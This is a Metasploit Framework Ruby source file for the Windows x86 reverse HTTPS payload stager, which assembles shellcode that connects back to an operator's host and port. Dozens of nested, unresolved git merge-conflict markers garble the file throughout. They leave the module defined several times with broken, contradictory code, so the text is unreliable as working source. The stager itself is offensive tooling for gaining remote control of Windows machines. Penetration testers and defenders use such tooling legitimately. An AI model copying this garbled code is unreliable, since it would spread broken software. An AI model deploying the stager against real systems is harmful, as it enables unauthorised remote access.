# -*- coding: binary -*-

require 'msf/core'
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
require 'msf/core/payload/transport_config'
=======
>>>>>>> feature/complex-payloads
=======
require 'msf/core/payload/transport_config'
>>>>>>> 4.11.2_release_pre-rails4
=======
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
=======
=======
<<<<<<< HEAD
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
=======
>>>>>>> pod/metasploit-gemfile-
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> master
=======
require 'msf/core/payload/transport_config'
>>>>>>> master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> master
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/complex-payloads
=======
=======
require 'msf/core/payload/transport_config'
>>>>>>> master
=======
require 'msf/core/payload/transport_config'
>>>>>>> master
=======
require 'msf/core/payload/transport_config'
>>>>>>> master
>>>>>>> pod/metasploit-gemfile-
=======
require 'msf/core/payload/transport_config'
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
require 'msf/core/payload/transport_config'
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
require 'msf/core/payload/transport_config'
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
require 'msf/core/payload/windows/reverse_http'

module Msf

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======

>>>>>>> feature/complex-payloads
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
=======
=======
<<<<<<< HEAD
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD

=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
=======
>>>>>>> pod/metasploit-gemfile-
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======

>>>>>>> pod/complex-payloads
=======
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> master
>>>>>>> pod/metasploit-gemfile-
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS
#
###

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_https(opts)
=======

=======
>>>>>>> 4.11.2_release_pre-rails4
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
<<<<<<< HEAD
=======
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
=======
=======
<<<<<<< HEAD
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> payload-generator.rb
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> pod/complex-payloads
=======
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-gemfile-

module Payload::Windows::ReverseHttps

  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate and compile the stager
  #
  def generate_reverse_https(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_http(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/complex-payloads
=======
>>>>>>> pod/metasploit-gemfile-
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_https(
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW),
        ssl:  true)
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_https(conf)
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
  def transport_config(opts={})
    transport_config_reverse_https(opts)
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/complex-payloads
=======
>>>>>>> pod/metasploit-gemfile-
  end

  # TODO: Use the CachedSize instead (PR #4894)
  def cached_size
    341
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> feature/complex-payloads
=======
=======
>>>>>>> msf-complex-payloads
=======
=======
=======
>>>>>>> pod/metasploit-gemfile-
=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/metasploit-gemfile-
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> pod/metasploit-gemfile-
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
<<<<<<< HEAD
>>>>>>> rapid7/master
=======
>>>>>>> master
>>>>>>> payload-generator.rb
=======
>>>>>>> master
=======
>>>>>>> master
>>>>>>> pod/metasploit-gemfile-
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_https(opts)
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
=======
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-gemfile-
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
=======
>>>>>>> pod/metasploit-gemfile-
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/complex-payloads
=======
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> master
>>>>>>> pod/metasploit-gemfile-
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
  end

end

end

